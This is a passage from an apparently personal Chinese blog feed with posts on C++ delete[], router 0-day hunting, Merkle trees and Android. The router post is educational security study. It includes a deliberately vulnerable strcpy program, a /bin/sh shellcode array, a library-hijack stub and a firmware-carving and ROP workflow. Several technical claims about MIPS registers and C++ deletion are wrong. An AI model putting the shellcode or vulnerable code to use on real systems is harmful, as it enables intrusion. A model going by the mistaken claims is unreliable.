是C++里面用于回收new的内存的关键字。一直用的是delete，这个delete[],还是在都这个代码里面第一次遇到。</p><p>根据自己开的资料里讲，如果单单new一个简单类型，那么实际效果是相同的</p><pre><code>int *a = new int[10];delete a;        //方式1delete [] a;     //方式2</code></pre><p>这里的a的空间大小是固定的，所以我们可以使用者两种方式来清理内存</p><p>不过如果遇到了特使情况。我们这里是复杂类型（complex）</p><pre><code>class A {        ...        ~A(){cout &lt;&lt; &quot;asd&quot;}};A *a = new A[10];delete a;  a = new A[10];delete pbabe[];</code></pre><p>这里两种表达方式就出现了差异。a 是直接删除了这个对象数组的头地址。的确也是释放了A[10]的空间，不过只会执行一次析构函数。而<code>delete[]</code> 会依次执行十次析构</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/07/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书《智能硬件安全》</title>
      <link>https://www.diglp.xyz/2018/03/03/Book_%E6%99%BA%E8%83%BD%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/</link>
      <guid>https://www.diglp.xyz/2018/03/03/Book_%E6%99%BA%E8%83%BD%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/</guid>
      <pubDate>Fri, 02 Mar 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;我想未来对安全方面的需求会越来越大，随着这个体系的越发庞大，其潜在的安全威胁，可能愈发的丰富。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>我想未来对安全方面的需求会越来越大，随着这个体系的越发庞大，其潜在的安全威胁，可能愈发的丰富。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：揭秘家用路由器0Day挖掘技术</li><li>作者：吴少华</li><li>ISBN：9787121263927</li></ul><p>硬件安全，将会随着物联网的兴起得到苏醒，而且变得更加的多元化</p><p>本书分为 三个部分</p><ul><li>基础知识</li><li>原理与应用</li><li>分析与利用</li></ul><p>同样这里对内容，所学做极简要总结。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>路由器漏洞分类：</p><ul><li>密码破解漏洞 WPA/WPS/WEP</li><li>WEB漏洞 SQL注入/远程命令执行/跨站脚本</li><li>特定后面 调试端口/admin</li><li>溢出漏洞 这个算是系统级别的</li></ul><p>路由的web安全和服务器web安全类似。</p><hr><p>常见的路由器其处理器结构基本是都是 <strong>MIPS</strong> 运行精简 <strong>LINUX</strong> ， 主要的基本 shell 功能由 <strong>BusyBox</strong> 实现</p><pre><code>busybox ls -lbusybox cd...</code></pre><p>路由器中的<code>ls</code>等基本命令由busyBox的链接实现。</p><hr><ul><li>GNU 工具集</li></ul><p>GCC 常用功能，不做展开。 <strong>GDB</strong> 作为主要调试器 命令常用需要掌握</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29tL2xpbms/dXJsPVNGRXZwUWZiOUlDWldJaEg0ZldKOVd6UmZteERlUEhoQ0pNQzZCd0NybEJ0cUtPN2tNaWVvMkJSVkpKaWY3ZXJoUVFfaDhtdDQ5d240RGt4bDE0RGNLJmFtcDt3ZD0mYW1wO2VxaWQ9YWMyOWIyYTEwMDAxOWQwODAwMDAwMDA2NWFlMTgzMjM=" title="https://www.baidu.com/link?url=SFEvpQfb9ICZWIhH4fWJ9WzRfmxDePHhCJMC6BwCrlBtqKO7kMieo2BRVJJif7erhQQ_h8mt49wn4Dkxl14DcK&amp;wd=&amp;eqid=ac29b2a100019d08000000065ae18323">GDB十分钟教程<i class="fa fa-external-link"></i></span></p></blockquote><p>值得注意的是，在使用GDB调试之前，elf文件需要包含调试信息</p><pre><code>gcc -ggdb main.c</code></pre><hr><ul><li>MIPS汇编及体系</li></ul><p>（感觉除了X86汇编，其他的都十分奇怪。。。）</p><p>一个<strong>32</strong>个寄存器，特殊的是 $0 寄存器，的值总是零，提供需要用到0的地方。29 = sp，30 = fm，31 = ra （返回）</p><p>MIPS是大端序(BIG_endian)，和网络字节序相同</p><blockquote><p><strong>高在高位是小端，高在低位是大端</strong></p></blockquote><pre><code>{num[n],num[n+1],num[n+2],num[n+3]}    #MSB    (Most Significant Byte){num[n+3],num[n+2],num[n+1],num[n]}    #LSB    (Least Significant Byte)</code></pre><blockquote><p>“大端”和“小端”可以追溯到1726年的Jonathan Swift的《格列佛游记》，其中一篇讲到有两个国家因为吃鸡蛋究竟是先打破较大的一端还是先打破较小的一端而争执不休，甚至爆发了战争。</p></blockquote><hr><ul><li>HTTP协议</li></ul><p>路由器的很多漏洞是存在于 Web服务器没有正确的仅需攻击者所发送的HTTP请求。</p><p><strong>HTTP请求行</strong></p><pre><code>[Method] [Request-URI] [HTTP-Version] [CRLF] eg: GET /from.html HTTP/1.1 (CRLF)</code></pre><blockquote><p>(CRLF是Carriage-Return Line-Feed的缩写，意思是回车换行，就是回车(CR, ASCII 13, \r) 换行(LF, ASCII 10, \n))</p></blockquote><p>这里规定，必须是以 <strong>CRLF</strong> 结尾，不允许出现单独 <strong>CR(回车)/LF(换行)</strong>,<strong>“\r\n”</strong>,<strong>“\x0D\x0A”</strong>。</p><p>（之前一个Qt用socket实现的http请求，不能得到正确GET的Respond 的原因）</p><p>Method 有很多种 GET/POST/HEAD/PUT/DELETE/TRACE/CONNECT/OPTIONS.</p><p>POST克服了GET方法的一些缺点。因为通过Post进行表单数据的提交的时候，数据本身不是URL请求的一部分，而是作为标准数据传送给服务器，这点克服了GET进行数据传递的时候信息无法加密和提交数据量太小的缺点。</p><p><strong>HTTP报头</strong></p><ul><li>Accept:    表示希望接收的资源类型</li><li>Accept-Encoding:    表示内容编码</li><li>Cookies:    表示客户端向服务器进行Cookies认证的信息</li><li>Accept-Encoding:    指定一种自然语言</li><li><strong>Host:主机及其端口号，默认80，通常从URL中得到</strong></li><li>User-Agent：    用户代理，实际上包含着用户的部分信息，系统，浏览器内核等等</li></ul><p>请求头示例：</p><pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cache-Control: max-age=0Connection: keep-aliveCookie: BAIDUID=5E1B56CB86750A3F365EDFC9FA1DA1A9:FG=1; BIDUPSID=E3A36946B81579878C6378864B750C4A; PSTM=1512745351; Hm_lvt_55b574651fcae74b0a9f1cf9c8d7c93a=1524673678,1524718817,1524727227,1524729701; Hm_lpvt_55b574651fcae74b0a9f1cf9c8d7c93a=1524729701; H_PS_PSSID=1420_21106; BDRCVFR[gltLrB7qNCt]=mk3SLVN4HKm; PSINO=7; pgv_pvi=3976877056; pgv_si=s5736833024DNT: 1Host: baike.baidu.com</code></pre><hr><ul><li>软件工具</li></ul><p>主要是虚拟机，IDA，BinWalk，QEMU。这些工具。</p><p>前两种不多做介绍了，虚拟机，和静态反编译工具。</p><p>BinWalk，主要用于对于固件包的自动化解包和分析，可以对目标架构，和目录结构，内核版本等等的信息进行自动分析。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMTA4NDI4MzE3Mi9hcnRpY2xlL2RldGFpbHMvNjY5NzEyNDI=" title="https://blog.csdn.net/qq1084283172/article/details/66971242">BinWalk的使用<i class="fa fa-external-link"></i></span></p></blockquote><p>QEMU 和 Bochs 类似是一个处理器模拟软件，在环境中，我们配合MIPS的交叉编译工具，可以实现一个本机模拟的MIPS的机器平台，方便我们进行各种测试。</p><hr><ul><li>路由0day基本挖掘方法</li></ul><p>对路由0day挖掘的初步方法大致以下</p><ul><li>固件分析 使用BinWalk对固件进行解包，提取其中的关键文件进行分析。</li><li><p><strong>动态运行库的劫持</strong></p><p>  对于一些关键的so(Sharded Object) 的里面的函数进行重写，即保留同样的函数符号，使用我们自己的函数内容实现一个新的so文件，并且替换源文件。</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int apmib_init(void){    //Fake it    return 1;}$ mips-linux-gcc -fPIC -shared apmib.c -o apmib-ld.so</code></pre><p>  实际上的过程，涉及到对so文件的静态分析，通过IDA对器进行逆向分析，在保留器原有函数的基础上，对部分的符号代码进行修改。</p></li></ul><h2 id="路由器安全"><a href="#路由器安全" class="headerlink" title="路由器安全"></a>路由器安全</h2><ul><li>web部分</li></ul><p>该书的这部分很简略，篇幅在几页，主要讲了有 <strong>XSS</strong> 和 <strong>CSRF</strong>。</p><p>XSS(Cross Site Scipting)，防止和 CSS(Cascading Style Sheets) 起名为 XSS。具体就是恶意的JS脚本插入，分为反射型和存储型。前者是主动触发，我们可以找到XSS点，构造反射链接，发送给受害者，存储型，常见的就是留言板。233</p><p>CSRF(Cross-Site Request Forgery) 是一种对网页的恶意利用。和XSS有着十分大的差别。其实际上不是通过插入的JS实现功能，实际上是对网页原文进行劫持之后进行的修改，最终实现了自己的代码会在目标主机执行。</p><ul><li>路由器后门<br>这种漏洞出现于官方的预留的端口，或者其他的超级密码。</li></ul><hr><ul><li>路由器溢出漏洞</li></ul><p>溢出漏洞是一个相当高危而且普遍的漏洞。</p><p><strong>栈溢出</strong></p><blockquote><p>在计算机科学中，栈是一种先进后出得(FILO)队列的数据结构。调用栈(Call Stack)是值存放在一个正在运行的函数的信息栈。调用栈本身又是由栈帧(Stack Frame)构成，每个栈帧对应一个未完成函数。</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMzNkZWJ1Zy9wLzY3NzMwNTkuaHRtbA==" title="https://www.cnblogs.com/33debug/p/6773059.html">函数的调用过程(栈帧)<i class="fa fa-external-link"></i></span></p></blockquote><p>在MIPS架构中，参数传递使用 $a1~$a4 着四个寄存器，（$a0是零值寄存器），所以我们的参数超过5个之后就会使用到了栈，进而进行第五个参数的传递。</p><p>MIPS中的溢出可行性:X86的架构不同， x86的调用过程，是发生函数调用时，把当前的函数地址压入栈中，在函数返回时直接进行弹栈，从而返回原函数的地址空间，但是在MIPS的架构下，函数调用时<strong>不会把原函数地址压栈</strong> 而是直接存入寄存器 <strong>$ra(返回地址寄存器)</strong>。下面时书中的溢出可行性分析：</p><p>在MIPS的架构中，有着 <strong>叶子函数和非叶子函数</strong> （这里竟然是查无此词，应该是作者自己的词）。</p><blockquote><p>个人理解讲:叶子函数这个词的叶子可以取于树结构，叶子说明函数体内没有调用其它的函数，也就是没有后继节点。非叶反之.</p></blockquote><p><strong>非叶子函数</strong>的情况:由于<strong>$ra</strong>寄存器只存在一个,所以实际上,如果是非叶子函数了,子函数体内部再次发生 Call 这样的话,会发生,把上一个函数的地址压栈,把调用函数的地址存入 <strong>$ra</strong> </p><p>所以和经典的溢出思路相同,还是覆盖掉压入栈中的返回地址.</p><p><strong>叶子函数</strong>情况:作为叶子函数,其没有后继的函数Call 所以,返回地址是保存在 <strong>$ra</strong> 中的,所以我们无法通过经典的思路进行覆盖(这个是寄存器了),不过也是存在利用可能,我们使用足够大的数据,覆盖掉上层函数的返回地址.(<strong>上层调用了我,上层一定时非叶子对吧</strong>)</p><p><strong>缓冲区溢出</strong><br>在缓冲区分配,和使用过程中的问题,比如对所缓冲数据没有做检测,导致其对栈内数据发生了覆盖</p><p>一般实现功能:拒绝服务,获得用户级权限,获得系统级权限(提权).</p><pre><code>#include &lt;stdio.h&gt;  #define PASSWORD &quot;1234567&quot;  int verify_password (char *password)  {     int authenticated;     char buffer[8]; // add local buffto be overflowed     authenticated=strcmp(password,PASSWORD);     strcpy(buffer,password); // over flowed here!     return authenticated;  }  main()  {     int valid_flag=0;     char password[1024];     while(1)     {        printf(&quot;please input password: &quot;);        scanf(&quot;%s&quot;, password);        valid_flag=verify_password(password);        if(valid_flag)        {           printf(&quot;incorrect password!\n\n&quot;);        }        else        {           printf(&quot;Congratulation! You have passed the verification!\n&quot;);           break;        }     }  } </code></pre><p>这里贴上一段简单代码,注释已经标明了溢出点,在;进行Cpy的时候,没有进行长度检测.</p><p>我们知道,局部变量是依次在栈中分配空间的,所以我们分配的8个字节的数组紧邻的就是 int . 这里我们可以实现的是</p><p><img src="https://upload-images.jianshu.io/upload_images/2897833-ec918cbd4442e4c4.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/453" alt=""></p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9iNTc0ZDY2NzhjNGY=" title="https://www.jianshu.com/p/b574d6678c4f">图片来自<i class="fa fa-external-link"></i></span></p></blockquote><ol><li>通过对 buffer的溢出,从而覆盖 那个int的值</li><li>覆盖返回地址(这一点就是无限的空间了)<strong>SHELLCODE</strong></li></ol><hr><ul><li>ShellCode</li></ul><p>可以使用覆盖返回地址之后.我们就可以让当前函数返回到我们希望的地方了.</p><p>这个地方,就可以是我们构造的ShelCode.</p><pre><code>char shellcode[] =&quot;\x55\x8b\xec\x51\x51\x83\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89&quot;&quot;\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e&quot;&quot;\x2f\x73\x68\x58&quot;;   //...VOID Sub_2(){    ((void(WINAPI*)(void))&amp;ShellCode)();}</code></pre><p>这里具体来又是一本书了…</p><hr><ul><li>文件系统提取</li></ul><p>固件的提取思路主要是找到一个文件的签名头,这样才可以识别出到底是什么文件,比如我们常用的<code>file</code></p><ol><li><strong>strings|grep</strong>    全文检索文件系统的 magic 签名头</li><li><strong>hexdump|grep</strong>    检索 magic 签名偏移</li><li><strong>dd|file</strong>         确定migic签名偏移处的文件系统格式</li></ol><p>eg: cramfs 的magic的签名是 0x28cd3d45,squashfs 有 sqsh,hsqs…</p><pre><code>string firmware.bin | grep `python -c &apos;print &quot;\x28\xcd\x3d\x45&quot;&apos;`string firmware.bin | grep `python -c &apos;print &quot;\x45\x3d\xcd\x28&quot;&apos;`</code></pre><p>这里对整个文件的字符串进行检索找到有没有符合 cramfs 的签名,这里之所以会寻找两次,是为了保证,大端和小端的两种情况.找到特征签名之后,我们就开始定位文件偏移</p><pre><code>hexdump -C firmware.bin | grep -n &apos;hsqs&apos;</code></pre><p>这里找到特征字符串的偏移.之后我们可以使用 DD 对文件进行提取</p><pre><code>dd if=firmware.bin bs=1 count=100 skip=1441936 of=squash.bin</code></pre><p>这里就是使用dd对文件进行偏移的提取了.</p><p><strong>自动提取大法 BinWalk</strong></p><h2 id="漏洞探索"><a href="#漏洞探索" class="headerlink" title="漏洞探索"></a>漏洞探索</h2><p>后面的部分针对漏洞的实际应用做了总结,慢慢的学习其中的过程。</p><p>实际上漏洞挖掘于应用流程如下</p><ol><li>劫持PC，确定缓冲区大小，并且定位确定控制偏移</li><li>编写代码通过QEMU虚拟机进行验证，并调试</li><li>确定攻击路径，并且构造ROP</li><li>利用攻击数据，编写 exploit代码，对路由进行测试</li></ol><p>如果知道了漏洞，其分析手法是可以直接通过 Strings 找到相关字符串的 应用位置，之后根据CallStack ，找到潜在的危险函数。</p><p>之后用脚本，构造测试用例。比如 <code>&#39;A&#39;*600</code> ，使其输入到对应的可能函数。在可疑部分下断，之后进行调试。</p><p>输入我们的用例，观测我们的栈中的  <strong>saved_ra</strong> （即非叶子函数的返回地址的压栈）是否被覆盖，从而可以得知此处是否有溢出漏洞，如果有那么 <strong>saved_ra</strong> 的值应该被覆盖为 <strong>0x41414141</strong>（即A的ascii）。由此我们可以确定缓冲区溢出存在。</p><p>之后就是确认我们的溢出的定位，使得我们可以精确的覆盖返回地址。这种方法叫做 <strong>ROP (Return-oriented programming)</strong></p><p>一般的POC中使用的溢出Payload，使用的是 System/Exec 这个函数，使得我们可以得到一个系统权限的Cli的返回</p><ul><li>硬件部分</li></ul><p><strong>FLASH</strong>的读取    这个直接拆下来进行数据的完全读取。</p><p><strong>串口探测</strong>    通过电压的测量 ，和对PCB的目测。</p><p><strong>JTAG探测</strong>    （jointed test action group）</p><h2 id="漏洞发掘思路"><a href="#漏洞发掘思路" class="headerlink" title="漏洞发掘思路"></a>漏洞发掘思路</h2><p>代码审计：静态审计，模糊测试</p><p>静态测试：通过IDA进行反编译，发现潜在的危险函数。</p><p>获取用户的数据函数</p><ul><li>argv</li><li>read(),fscanf(),getc(),</li><li>stdin</li><li>read(),recv(),recvfrom()</li></ul><p>数据操作函数</p><ul><li>strcpy()</li><li>strncpy()</li><li>system(),execve()</li><li>sprintf(),snprintf()</li></ul><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>实际上,关于硬件安全的分析,在这本书从软件和硬件层面都去展现了一个漏洞发掘的过程,很难- 得,也是巩固了不少相关的知识.</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/03/03/Book_%E6%99%BA%E8%83%BD%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/#disqus_thread</comments>
    </item>
    
    <item>
      <title>什么是默克尔树</title>
      <link>https://www.diglp.xyz/2018/02/28/MerkleTree_1/</link>
      <guid>https://www.diglp.xyz/2018/02/28/MerkleTree_1/</guid>
      <pubDate>Tue, 27 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;blockquote&gt;
&lt;p&gt;许多区块链或是散列链都是基于一种叫做默克尔树的结构。与相对概念比较新的区块链技术相比，默克尔树最早诞生于1979年，由Ralph Merkle发明。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Hash&quot;&gt;&lt;a href=&quot;#Hash&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<blockquote><p>许多区块链或是散列链都是基于一种叫做默克尔树的结构。与相对概念比较新的区块链技术相比，默克尔树最早诞生于1979年，由Ralph Merkle发明。</p></blockquote><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>hash（散列算法），使我们生活中极为常用。其定义就是对任意长度的数据输入经过该算法后得到一个定长的输出。这样的一个映射具有唯一性，和单向性。</p><ul><li>唯一性 是指， 输入和输出是唯一对应的，不存在输入到输出的多个映射</li><li><p>单向性 是指， 由输入很容易计算出输出，但是输出很难得到输入。（实际上使用大量计算数学（碰撞）上是可能找到，所以说是很难）。</p><p>  –        </p><p>  MD5 (“hellowolrd”) = 78932c6b96a60237f48407558e91cb23<br>  MD5 (“helloworlD”) = 9f7599f32fcd536ccfb8c668f735a588<br>  MD5 (“hellowor1d”) = 9063e763e70bea4fc4052ed7ac933428</p></li></ul><p>这里可见，输入数据的小变化进行Hash之后的输出是天壤之别了已经，这个也是哈希技术的一个核心点叫做输入敏感性。所以散列技术也是用作<strong>数据指纹（FingerPoint）</strong>。<br>常用的散列算法有 <code>MD5，sha1，sha256</code>等。</p><h2 id="Hash-Table"><a href="#Hash-Table" class="headerlink" title="Hash Table"></a>Hash Table</h2><p>哈希表，现在就说BT下载了。（下的人越多，越快）要是究其原因就很简单，因为是P2P从大家哪里获取资源呀。</p><p>可是现在问题来了，我们从这么多的匿名用户地方获取我们的资源，我们怎么能保证这些提供资源的节点不作恶呢？万一我的100G的小姐姐，被突然换成了新闻联播怎么办？？？！！！</p><p>这里很自然就要用到上面的数据指纹技术了！我们先把这个小姐姐的MD5（指纹）接受过来，然后我们对下载的东西进行校验。一眼就看出了，这不是新闻联播，这样就不用傻傻的下上一天了。</p><p>-<br>其实上面我们设想的情景看似可以，可是我们忽略了一个问题，我在完成整个文件的下载前如果计算它的hash呢？？？ 实际上BT下载是把整个文件分散的存储到各个节点上，具体的结构看图。</p><p><img src="/images/BC_hash.png" alt="hash"><br>对每个小块先做一边hash校验，确保每个块的内容是正确的，日狗hash对不上就舍弃这个错误块，当整个文件下载完成之后，再进行一边整体的hash，用于确保我们整个文件的完整性。</p><h3 id="DHT"><a href="#DHT" class="headerlink" title="DHT"></a>DHT</h3><p>如果在使用迅雷下载小电影的时候，有点开下载详情， 那么对<code>DHT</code>这个词汇一定不会太陌生。 </p><p>DHT的全称是Distributed Hash Table, 直译过来的是<code>分布式哈希表</code>。哈希表（hash table）是一种很常见的数据结构。我们常用的数据结构Map就是哈希表的一直实现。实际上就是建立了一个键到散列的映射（Key-Value）键值对。</p><h2 id="Merkle-Tree"><a href="#Merkle-Tree" class="headerlink" title="Merkle Tree"></a>Merkle Tree</h2><blockquote><p>Merkle Tree可以看做Hash List的泛化（Hash List可以看作一种特殊的Merkle Tree，即树高为2的多叉Merkle Tree）。</p></blockquote><p>不同于Hashlist，默克尔树是二叉结构，所有的根节点两两进行hash，得到其父节点，父节点再次进行两两hash，最终会得到一个根节点（Merkle Root）。</p><p>默克尔树在使用时，从根节点出发，同步下一个高度（D1）的数据（D2的hash），得到（D1）的两个hash值之后，自己进行hash校验。如果正确继续进行下一级的Hash的获取（这次将会有4个Hash），得到之后再次进行校验。正确则继续获取下一层的Hash，这样递归下去，直到得到存放在根节点的数据。</p><p>拓扑图如下，整体结构是一个倒挂的二叉树。<br><img src="/images/BC_MK.jpeg" alt="merkle"></p><blockquote><p>Merkle Tree的特点</p><ul><li>MT是一种树，大多数是二叉树，也可以多叉树，无论是几叉树，它都具有树结构的所有特点；</li><li>Merkle Tree的叶子节点的value是数据集合的单元数据或者单元数据HASH。</li><li>非叶子节点的value是根据它下面所有的叶子节点值，然后按照Hash算法计算而得出的。</li></ul></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/28/MerkleTree_1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>一周干货集 (2)</title>
      <link>https://www.diglp.xyz/2018/02/25/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_2/</link>
      <guid>https://www.diglp.xyz/2018/02/25/misc_%E4%B8%80%E5%91%A8%E6%9D%82%E8%AE%B0_2/</guid>
      <pubDate>Sat, 24 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;长路漫漫, 看看一群财富自由的人韬略江山, 心中还是有很多想法.现在知识和信息的膨胀速度,哪里容得娱乐的放肆&lt;/p&gt;
&lt;h2
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>长路漫漫, 看看一群财富自由的人韬略江山, 心中还是有很多想法.现在知识和信息的膨胀速度,哪里容得娱乐的放肆</p><h2 id="安卓踩坑"><a href="#安卓踩坑" class="headerlink" title="安卓踩坑"></a>安卓踩坑</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc3c5NTA3MjkvYXJ0aWNsZS9kZXRhaWxzLzUzNDQ0MzIz" title="http://blog.csdn.net/sw950729/article/details/53444323">你必须学会的okhttp——入门篇<i class="fa fa-external-link"></i></span><br>这里使用 android里面比较好用的一个第三方包</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NxdWFyZS9va2h0dHA=" title="https://github.com/square/okhttp">OKHTTP<i class="fa fa-external-link"></i></span></p><p> 直接修改Gradle <code>(build.gradle)</code> 脚本进行安装</p><pre><code>testImplementation &apos;com.squareup.okhttp3:mockwebserver:3.9.1&apos;</code></pre><h3 id="网络权限"><a href="#网络权限" class="headerlink" title="网络权限"></a>网络权限</h3><p>API 22 以上不允许 主线程进行网络操作,怕卡.<br>否则会报异常.</p><p>新建一个项目，在AndroidManiifest中添加</p><pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</code></pre><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuMmN0by5jb20va2YvMjAxNTAzLzM4MTM2My5odG1s" title="https://www.2cto.com/kf/201503/381363.html">通过Http协议下载图片<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemx3MTAwNS9hcnRpY2xlL2RldGFpbHMvMjExOTIyNTU=" title="http://blog.csdn.net/zlw1005/article/details/21192255">Android Handle的使用<i class="fa fa-external-link"></i></span></p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>子线程不能操作UI, 所以使用消息(message)使主线程处理</p><p>消息使用Handle 处理, 初始化需要loop</p><h3 id="Gson"><a href="#Gson" class="headerlink" title="Gson"></a>Gson</h3><p>Gson 简直是解放灵魂. 配合插件 GsonFormater</p><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2hlbjM2NDU2NzYyOC9hcnRpY2xlL2RldGFpbHMvNTMxOTEzODM=" title="http://blog.csdn.net/chen364567628/article/details/53191383">报异常可能<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83ZTc5MWUyNGVmYjM=" title="https://www.jianshu.com/p/7e791e24efb3">Android简单使用GSON<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvb3FpaGFvZ29uZ3l1YW4vYXJ0aWNsZS9kZXRhaWxzLzUwOTQ0NzU1" title="http://blog.csdn.net/oqihaogongyuan/article/details/50944755">实用配置<i class="fa fa-external-link"></i></span></p><h3 id="MAP-字典"><a href="#MAP-字典" class="headerlink" title="MAP 字典"></a>MAP 字典</h3><p>使用匿名函数进行初始化</p><pre><code>private HashMap&lt;String, String&gt; urlMap = new HashMap&lt;String, String&gt;() {    {        // token        put(&quot;token&quot;, &quot;https://api.etherscan.io/api?module=stats&amp;action=tokensupply&amp;contractaddress=0x57d90b64a1a57749b0f932f1a3395792e12e7055&amp;apikey=&quot;);        // block        put(&quot;block&quot;, &quot;https://api.etherscan.io/api?module=proxy&amp;action=eth_blockNumber&amp;apikey=&quot;);    }};</code></pre><h3 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIwMzc3Mjg1" title="https://www.zhihu.com/question/20377285">UI开源库<i class="fa fa-external-link"></i></span></p><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vUWlhbjEyMy9wLzU3MTU0MDIuaHRtbA==" title="https://www.cnblogs.com/Qian123/p/5715402.html">异常体系详解<i class="fa fa-external-link"></i></span></p><h3 id="Web3J"><a href="#Web3J" class="headerlink" title="Web3J"></a>Web3J</h3><p>需要补充一个 sl4f 依赖</p><h3 id="测试单元"><a href="#测试单元" class="headerlink" title="测试单元"></a>测试单元</h3><p>本机以java为单位 使用<code>@Test</code>测试函数, 可以throws , </p><pre><code>@Testpublic void getVersion() throws Exception {    System.out.println(web3j.getClientVersion());}</code></pre><h2 id="编程思想-语言类型"><a href="#编程思想-语言类型" class="headerlink" title="编程思想 语言类型"></a>编程思想 语言类型</h2><p>写Web3 应用的时候, Web3.js 是node.js下的一个很棒的库, 本以为Java下没有Web3 的库,打算自己写RPC实现. 最后在别人的指点下发现了WebJ 这个安卓下的 Web3 库. 可是感觉其编程思想太过于贴近Js了,编程范式（paradigm）这里做个简单的总结</p><ul><li>POP (Process-oriented programming)    面向过程</li><li>OOP (Object Oriented Programming)    面向对象</li></ul><ul><li>FP (Functional Programming)            函数式编程</li><li>IP (Immutable Programming)            命令式编程</li></ul><h3 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h3><blockquote><p>“面向过程”(Procedure Oriented)是一种以过程为中心的编程思想。这些都是以什么正在发生为主要目标进行编程，不同于面向对象的是谁在受影响。与面向对象明显的不同就是封装、继承、类。</p></blockquote><p>这个是最先产生的一直编程思想吧, 面向过程编程, 就是围绕着功能的实现进行代码的编写.这种方式更像是实现一个图灵机. 你把输入给进参数,执行过程,之后得到输出</p><pre><code>吃(猪八戒, 西瓜);// 老梗了, 但是这里很好的体现了POP的编程思想,输入数据得到结果</code></pre><h3 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h3><p>面向对象的产生就是在面向过程之后了, 可能Coder认识到了, 世间万物皆为对象.所以使用OOP的方式在代码里创建对象(物品), 对象有它的参数, 功能.这样新的思想遍产生了,而不是图灵机~</p><p>没有对象? New一个</p><pre><code>Girl girl = new Girl(YourProfie);</code></pre><p>OOP产生的对象, 可以很好的践行 <strong>高内聚低耦合</strong> 这一伟大思想(笑),<br>因为互相访问都只是通过Class之间暴露的接口(public), 这样如果我要优化代码,可以只改变某个类的内部代码, 而保持接口一致就好. 很好的避免了面向过程中常常出现的代码规模大了之后牵一发而动全身的情景</p><p>这里还是举个例子</p><pre><code>猪八戒.吃(西瓜);// 可以见到, 这种编程思想把对象作为中心, 对象执行成员方法</code></pre><p>对了, OOP之于POP多的编程三大基本特性称之为 封装、继承、多态</p><ul><li>封装 把客观相似事物封装成抽象的类</li><li>继承 对派生类直接保留原属性 (白马,马). </li><li>多态 允许将子类类型的指针赋值给父类类型的指针. (重载, 覆写@Override)</li></ul><blockquote><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGd1aXN1L2FydGljbGUvZGV0YWlscy83NjA5NDgz" title="http://blog.csdn.net/hguisu/article/details/7609483">UML类关系<i class="fa 